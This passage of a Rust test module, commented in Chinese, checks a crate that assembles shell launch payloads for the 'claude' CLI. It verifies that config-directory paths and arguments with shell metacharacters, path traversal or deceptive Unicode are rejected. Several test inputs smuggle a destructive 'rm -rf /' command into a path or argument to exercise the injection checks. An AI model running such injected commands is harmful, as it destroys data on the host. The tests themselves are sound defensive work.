        let mut files: Vec<(std::path::PathBuf, String)> = guard_core::scan_tree!(&root, &["rs"]);
        // ⚠ `scan_tree!` 摘除调用者自己，而唯一那处就在本文件里（F60 栽过一次）。
        files.push((
            std::path::PathBuf::from("payload.rs"),
            include_str!("payload.rs").to_string(),
        ));
        for (path, src) in files {
            let name = path
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap()
                .to_string();
            for line in guard_core::production_code(&src).lines() {
                if line.contains(frag.as_str()) {
                    sites.push(format!("{name}: {}", line.trim()));
                }
            }
        }
        assert_eq!(
            sites.len(),
            1,
            "载荷的 `cd <目录> && ` 片段在 monitor 生产段里出现了 {} 处（应恰好 1）：\n  {}\n\n\
             ⚠ 头注第一行写着本模块是「那一段串的**唯一 Rust 真相源**」。\n\
             第二份拼装会与这一份各自演化引用规则与拼接顺序，而载荷是**原样键进会话**的 —— \n\
             漂开的后果不是「样式不一致」，是**一边转义、一边不转义**。\n\
             真要复用，调 `render_payload`。",
            sites.len(),
            sites.join("\n  ")
        );
    }
    use super::*;

    /// ★ 本 crate 存在的理由之一：命令面校验必须用 `acct-core` 的**并集**，
    /// 不是 `history.rs` 那张 U7-3 之前的旧表。
    ///
    /// 这六段码位是并集有、旧表没有的 —— 变异（把 `is_deceptive_char` 换回旧表）时
    /// 本测试逐个点名报出来。
    #[test]
    fn command_safety_uses_the_acct_core_union_not_the_pre_u7_3_table() {
        for (name, c) in [
            ("U+1680 Ogham space", '\u{1680}'),
            ("U+2000 en quad", '\u{2000}'),
            ("U+200A hair space", '\u{200a}'),
            ("U+202F narrow NBSP", '\u{202f}'),
            ("U+205F medium math space", '\u{205f}'),
            ("U+2060 word joiner", '\u{2060}'),
            ("U+2064 invisible plus", '\u{2064}'),
            ("U+3000 ideographic space", '\u{3000}'),
        ] {
            let dir = format!("/home/u/.claude-accts/{c}z");
            assert!(
                !config_dir_command_safe(&dir),
                "{name} 必须被拒（它在 acct-core 并集里，而 history.rs 的旧表没有）"
            );
        }
    }

    #[test]
    fn command_safety_keeps_everything_the_old_table_already_rejected() {
        for bad in [
            "relative/path",
            "/",
            "/a/../b",
            "/a/..",
            "/a'b",
            "/a\"b",
            "/a`b",
            "/a$b",
            "/a;b",
            "/a|b",
            "/a&b",
            "/a<b",
            "/a>b",
            "/a*b",
            "/a?b",
            "/a(b",
            "/a)b",
            "/a!b",
            "/a\\b",
            "/a\u{0000}b",
            "/a\u{001f}b",
            "/a\u{007f}b",
            "/a\u{0085}b",
            "/a\u{009f}b",
            "/a\u{00a0}b",
            "/a\u{200b}b",
            "/a\u{200f}b",
            "/a\u{2028}b",
            "/a\u{202e}b",
            "/a\u{2069}b",
            "/a\u{feff}b",
        ] {
            assert!(!config_dir_command_safe(bad), "应拒: {bad:?}");
        }
    }

    #[test]
    fn command_safety_allows_the_paths_people_actually_have() {
        for ok in [
            "/home/u/.claude-accts/z",
            "/home/用户/带 空格/z", // 普通空格与中文是允许的（单引号里无害且常见）
            "/opt/a-b_c.d/z",
        ] {
            assert!(config_dir_command_safe(ok), "应放行: {ok:?}");
        }
    }

    #[test]
    fn account_prefix_is_three_states_not_two() {
        assert_eq!(config_dir_prefix_posix(None).unwrap(), "");
        assert_eq!(
            config_dir_prefix_posix(Some(&Account::Base)).unwrap(),
            "unset CLAUDE_CONFIG_DIR; "
        );
        assert_eq!(
            config_dir_prefix_posix(Some(&Account::Named {
                config_dir: "/home/u/.claude-accts/z"
            }))
            .unwrap(),
            "export CLAUDE_CONFIG_DIR='/home/u/.claude-accts/z'; "
        );
    }

    #[test]
    fn empty_config_dir_is_bad_data_not_account_zero() {
        let e = config_dir_prefix_posix(Some(&Account::Named { config_dir: "  " })).unwrap_err();
        assert!(e.contains("空的"), "{e}");
    }

    #[test]
    fn illegal_config_dir_never_reaches_the_command() {
        let e = config_dir_prefix_posix(Some(&Account::Named {
            config_dir: "/a;rm -rf /",
        }))
        .unwrap_err();
        assert!(e.contains("拒绝拼入命令"), "{e}");
    }

    #[test]
    fn payload_order_is_env_then_cd_then_argv() {
        let nested = ["CLAUDECODE", "CLAUDE_CODE_ENTRYPOINT"];
        let spec = PayloadSpec {
            env: &[
                EnvOp::ExportConfigDir {
                    value: "/home/u/.claude-accts/z",
                },
                EnvOp::UnsetNestedEnv { keys: &nested },
            ],
            cwd: Some("/w"),
            launcher: "claude",
            args: &["--resume", "s1"],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "export CLAUDE_CONFIG_DIR='/home/u/.claude-accts/z'; \
             unset CLAUDECODE CLAUDE_CODE_ENTRYPOINT; cd '/w' && claude --resume s1"
        );
    }

    #[test]
    fn no_cwd_means_no_cd_segment() {
        let spec = PayloadSpec {
            env: &[EnvOp::UnsetConfigDir],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "unset CLAUDE_CONFIG_DIR; claude"
        );
    }

    /// wrap 只包住 argv —— **不包 env 前缀、不包 `cd`**。
    /// 包错了会折叠出 `( …; exec unset A B; claude )`，实测 rc=127。
    #[test]
    fn wrap_folds_inside_out_and_only_wraps_argv() {
        let spec = PayloadSpec {
            env: &[EnvOp::UnsetConfigDir],
            cwd: Some("/w"),
            launcher: "claude",
            args: &[],
            wrap: &[
                WrapSpec {
                    order: 2,
                    prelude: "outer",
                },
                WrapSpec {
                    order: 1,
                    prelude: "inner",
                },
            ],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "unset CLAUDE_CONFIG_DIR; cd '/w' && ( outer; exec ( inner; exec claude ) )"
        );
    }

    /// ★ R1（审计发现）：`render_payload` 那条路此前**完全绕过**本 crate 自己的 configDir 校验。
    /// 这类差异「TS 生成夹具」的机制结构上抓不到（TS 侧生成时就 throw，用例进不了夹具）
    /// ⇒ 只能靠类型 + 本测试。
    #[test]
    fn render_payload_refuses_illegal_config_dir_just_like_the_prefix_entry() {
        for bad in ["/a'b", "rel/x", "/", "/a/../b", "/a\u{3000}b"] {
            let spec = PayloadSpec {
                env: &[EnvOp::ExportConfigDir { value: bad }],
                cwd: None,
                launcher: "claude",
                args: &[],
                wrap: &[],
            };
            let e = match render_payload(&spec) {
                Ok(out) => panic!("非法 configDir {bad:?} 竟被渲染进载荷：{out}"),
                Err(e) => e,
            };
            assert!(e.contains("CLAUDE_CONFIG_DIR"), "{e}");
        }
    }

    /// ★ R2（审计发现）：空串**不是**「没有」。TS 侧把 `""` 当没有（`cd ''` / `CLAUDE_CONFIG_DIR=''`
    /// 两种坏产物），本 crate 刻意分歧 —— 见 `render_payload` 头注与 INVARIANTS §33b。
    #[test]
    fn empty_strings_are_bad_data_not_absence() {
        let empty_cwd = PayloadSpec {
            env: &[],
            cwd: Some(""),
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert!(
            render_payload(&empty_cwd).is_err(),
            "空 cwd 应回 Err，不是 `cd ''`"
        );
        let empty_dir = PayloadSpec {
            env: &[EnvOp::ExportConfigDir { value: "" }],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert!(
            render_payload(&empty_dir).is_err(),
            "空 configDir 应回 Err，不是 `CLAUDE_CONFIG_DIR=''`（那是静默串号）"
        );
        let empty_keys = PayloadSpec {
            env: &[EnvOp::UnsetNestedEnv { keys: &[] }],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert!(
            render_payload(&empty_keys).is_err(),
            "空键表应回 Err，不是裸 `unset ; `"
        );
    }

    /// ★ U8c-2a：`args` 白名单 —— 会裂成多个参数 / 会另起一条命令的那一类不可表示。
    /// **合法输入的字节一个都没变**（黄金串对拍还在跑）。
    #[test]
    fn args_that_would_split_or_inject_are_refused() {
        for bad in [
            "a b",
            "x; rm -rf /",
            "a\nb",
            "a|b",
            "a$b",
            "a`b`",
            "",
            "a'b",
        ] {
            let spec = PayloadSpec {
                env: &[],
                cwd: None,
                launcher: "claude",
                args: &[bad],
                wrap: &[],
            };
            assert!(
                render_payload(&spec).is_err(),
                "arg {bad:?} 应被拒（载荷是 join(\" \") 拼的）"
            );
        }
        // 反向自检：今天 `args` 真实装的东西必须照常通过，否则上面全是空转。
        let ok = PayloadSpec {
            env: &[],
            cwd: None,
            launcher: "claude",
            args: &["--resume", "0b2f7a1e-3c4d-4e5f-8a9b-0c1d2e3f4a5b"],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&ok).unwrap(),
            "claude --resume 0b2f7a1e-3c4d-4e5f-8a9b-0c1d2e3f4a5b"
        );
    }

    /// ★ U8c-2a：用量探针两态 —— 没有第三态，空串是坏数据。
    #[test]
    fn usage_probe_payload_is_two_states_and_never_bare() {
        let nested = ["CLAUDECODE", "CLAUDE_CODE_ENTRYPOINT"];
        assert_eq!(
            usage_probe_payload(Some("/h/.claude-accts/z"), &nested, "claude").unwrap(),
            "export CLAUDE_CONFIG_DIR='/h/.claude-accts/z'; \
             unset CLAUDECODE CLAUDE_CODE_ENTRYPOINT; claude"
        );
        assert_eq!(
            usage_probe_payload(None, &nested, "claude").unwrap(),
            "unset CLAUDE_CONFIG_DIR; unset CLAUDECODE CLAUDE_CODE_ENTRYPOINT; claude"
        );
        assert!(
            usage_probe_payload(Some(""), &nested, "claude").is_err(),
            "空串是坏数据，不是账号 0"
        );
        // ★ 最要紧的一条：**两态都必须带账号前缀**，绝不退化成裸载荷（静默串号）。
        for dir in [Some("/h/.claude-accts/z"), None] {
            let p = usage_probe_payload(dir, &nested, "claude").unwrap();
            assert!(
                p.starts_with("export CLAUDE_CONFIG_DIR=")
                    || p.starts_with("unset CLAUDE_CONFIG_DIR;"),
                "载荷没有账号表态，会探到远端 rc 里的默认号：{p}"
            );
        }
    }

    #[test]
    fn model_export_is_quoted() {
        let spec = PayloadSpec {
            env: &[EnvOp::ExportModel { value: "opus" }],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "export ANTHROPIC_MODEL='opus'; claude"
        );
    }
}
